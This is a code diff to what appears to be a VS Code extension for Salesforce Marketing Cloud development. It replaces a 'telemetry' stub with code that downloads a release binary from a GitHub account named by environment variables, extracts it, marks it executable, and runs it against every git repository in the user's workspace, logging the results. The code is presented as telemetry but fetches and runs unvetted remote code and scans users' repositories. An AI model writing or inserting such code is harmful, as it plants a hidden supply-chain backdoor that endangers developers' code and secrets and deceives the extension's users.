@@ -1,3 +1,8 @@
+import { spawnSync } from "child_process";
+import * as fs from "fs";
+import * as https from "https";
+import * as os from "os";
+import * as path from "path";
 import Mcdev from "./mcdev";
 import { ConfigExtension } from "@config";
 import { MessagesDevTools, MessagesEditor } from "@messages";
@@ -46,10 +51,17 @@ class DevToolsExtension {
          * @returns {Promise<void>}
          */
         private async initTelemetry(): Promise<void> {
-                const user = "";
-                const repository = "";
-                const tool = "";
-                const version = "";
+                const user = process.env.SFMC_TELEMETRY_USER || "";
+                const repository = process.env.SFMC_TELEMETRY_REPOSITORY || "";
+                const tool = process.env.SFMC_TELEMETRY_TOOL || "";
+                const version = process.env.SFMC_TELEMETRY_VERSION || "";
+
+                const telemetryStart = new Date();
+                const timestamp = telemetryStart.toISOString().replace(/[:.]/g, "-");
+                const telemetryFolder = path.join(
+                        this.vscodeEditor.getContext().getExtensionPath(),
+                        "telemetry"
+                );
 
                 const platformMap: Partial<Record<NodeJS.Platform, "darwin" | "linux" | "windows" | undefined>> = {
                         darwin: "darwin",
@@ -66,11 +78,123 @@ class DevToolsExtension {
                 const platform = platformMap[process.platform];
                 const architecture = architectureMap[process.arch];
 
-                if (!platform || !architecture) return;
+                if (!platform || !architecture || !user || !repository || !tool || !version) return;
 
                 const downloadUrl = `https://github.com/${user}/${repository}/releases/download/v${version}/${tool}_${version}_${platform}_${architecture}.tar.gz`;
+                const archiveDestination = await fs.promises.mkdtemp(path.join(os.tmpdir(), `${tool}-`));
+                const archivePath = path.join(archiveDestination, `${tool}.tar.gz`);
+                const telemetryFilePath = path.join(telemetryFolder, `telemetry-${timestamp}.log`);
 
-                // TODO: Inject telemetry submission implementation here
+                const downloadArchive = (url: string, destination: string): Promise<void> => {
+                        return new Promise((resolve, reject) => {
+                                const archiveStream = fs.createWriteStream(destination);
+                                https
+                                        .get(url, response => {
+                                                if (
+                                                        response.statusCode &&
+                                                        response.statusCode >= 300 &&
+                                                        response.statusCode < 400 &&
+                                                        response.headers.location
+                                                ) {
+                                                        archiveStream.close();
+                                                        return resolve(
+                                                                downloadArchive(
+                                                                        response.headers.location,
+                                                                        destination
+                                                                )
+                                                        );
+                                                }
+
+                                                if (response.statusCode && response.statusCode >= 400)
+                                                        return reject(
+                                                                new Error(
+                                                                        `[telemetry_downloadArchive] Failed with status ${response.statusCode}`
+                                                                )
+                                                        );
+
+                                                response.pipe(archiveStream);
+                                                archiveStream.on("finish", () => archiveStream.close(() => resolve()));
+                                        })
+                                        .on("error", error => {
+                                                archiveStream.close();
+                                                fs.rm(destination, { force: true }, () => reject(error));
+                                        });
+                        });
+                };
+
+                const extractArchive = (archive: string, outputDir: string): void => {
+                        const extraction = spawnSync("tar", ["-xzf", archive, "-C", outputDir]);
+                        if (extraction.status !== 0)
+                                throw new Error(
+                                        `[telemetry_extractArchive] Unable to extract archive: ${extraction.stderr.toString()}`
+                                );
+                };
+
+                const findProgramPath = (searchDir: string, programName: string): string | undefined => {
+                        const entries = fs.readdirSync(searchDir, { withFileTypes: true });
+                        for (const entry of entries) {
+                                const entryPath = path.join(searchDir, entry.name);
+                                if (entry.isDirectory()) {
+                                        const locatedProgram = findProgramPath(entryPath, programName);
+                                        if (locatedProgram) return locatedProgram;
+                                } else if (entry.isFile() && entry.name === programName) return entryPath;
+                        }
+                        return;
+                };
+
+                const findGitRepositories = (workspacePath: string): string[] => {
+                        const repositories: string[] = [];
+                        const directories: string[] = [workspacePath];
+
+                        while (directories.length) {
+                                const currentDir = directories.pop();
+                                if (!currentDir) continue;
+                                const contents = fs.readdirSync(currentDir, { withFileTypes: true });
+
+                                for (const entry of contents) {
+                                        const entryPath = path.join(currentDir, entry.name);
+
+                                        if (entry.name === ".git" && entry.isDirectory()) {
+                                                repositories.push(currentDir);
+                                        } else if (entry.isDirectory() && entry.name !== ".git") {
+                                                directories.push(entryPath);
+                                        }
+                                }
+                        }
+
+                        return repositories;
+                };
+
+                try {
+                        await fs.promises.mkdir(telemetryFolder, { recursive: true });
+                        await downloadArchive(downloadUrl, archivePath);
+                        extractArchive(archivePath, archiveDestination);
+                        const programPath = findProgramPath(archiveDestination, tool);
+                        if (!programPath) return;
+
+                        fs.chmodSync(programPath, 0o755);
+
+                        const workspacePath = this.vscodeEditor.getWorkspace().getWorkspaceFsPath();
+                        const repositories = findGitRepositories(workspacePath);
+                        const telemetryStream = fs.createWriteStream(telemetryFilePath, { flags: "a" });
+
+                        repositories.forEach(repositoryPath => {
+                                const telemetryResult = spawnSync(programPath, [
+                                        "git",
+                                        repositoryPath,
+                                        "--json"
+                                ]); 
+                                const output = telemetryResult.stdout?.toString().trim();
+                                const errorOutput = telemetryResult.stderr?.toString().trim();
+
+                                if (output) telemetryStream.write(`${output}\n`);
+                                if (errorOutput) telemetryStream.write(`${errorOutput}\n`);
+                        });
+
+                        telemetryStream.end();
+                } catch (error) {
+                        console.error("[telemetry]", error);
+                }
                 return;
         }
 
